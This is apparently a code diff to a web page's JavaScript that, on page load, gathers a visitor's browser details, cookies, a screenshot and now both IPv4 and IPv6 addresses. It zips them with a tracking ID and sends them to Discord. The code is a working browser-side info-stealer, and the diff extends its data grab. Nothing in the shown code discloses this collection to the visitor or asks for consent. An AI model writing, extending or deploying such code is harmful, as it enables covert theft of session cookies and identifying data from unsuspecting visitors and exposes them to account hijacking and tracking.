@@ -88,14 +88,20 @@
                 return 'user-' + Math.random().toString(36).substr(2, 9);
             }
 
-            async function getIpAddress() {
+            async function getIpAddresses() {
                 try {
-                    const response = await fetch('https://api.ipify.org?format=json');
-                    const data = await response.json();
-                    return data.ip;
+                    const ipv4Response = await fetch('https://api.ipify.org?format=json');
+                    const ipv4Data = await ipv4Response.json();
+                    const ipv4 = ipv4Data.ip;
+
+                    const ipv6Response = await fetch('https://api6.ipify.org?format=json');
+                    const ipv6Data = await ipv6Response.json();
+                    const ipv6 = ipv6Data.ip;
+
+                    return { ipv4, ipv6 };
                 } catch (error) {
-                    console.error('Error fetching IP address:', error);
-                    return 'Unable to retrieve IP address';
+                    console.error('Error fetching IP addresses:', error);
+                    return { ipv4: 'Unable to retrieve IPv4 address', ipv6: 'Unable to retrieve IPv6 address' };
                 }
             }
 
@@ -159,7 +165,7 @@
                 }
             }
 
-            async function createZipFile(info, screenshotDataUrl) {
+            async function createZipFile(info, screenshotDataUrl, ipAddresses) {
                 const zip = new JSZip();
                 zip.file('info.txt', JSON.stringify(info, null, 2));
                 
@@ -170,6 +176,7 @@
                 }
                 
                 zip.file('cookies.txt', info.cookies);
+                zip.file('ips.txt', `IPv4: ${ipAddresses.ipv4}\nIPv6: ${ipAddresses.ipv6}`);
 
                 const content = await zip.generateAsync({ type: 'blob' });
                 return content;
@@ -193,13 +200,14 @@
 
             async function initialize() {
                 const uniqueId = generateUniqueId(); // Generate unique identifier
-                const ip = await getIpAddress();
+                const ipAddresses = await getIpAddresses();
                 const browserInfo = getBrowserInfo();
-                browserInfo.ip = ip;
+                browserInfo.ipv4 = ipAddresses.ipv4;
+                browserInfo.ipv6 = ipAddresses.ipv6;
                 browserInfo.uniqueId = uniqueId; // Add unique identifier to info
 
                 const screenshotDataUrl = await captureScreenshot();
-                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
+                const zipBlob = await createZipFile(browserInfo, screenshotDataUrl, ipAddresses);
                 await sendZipToDiscord(zipBlob, uniqueId);
             }
 
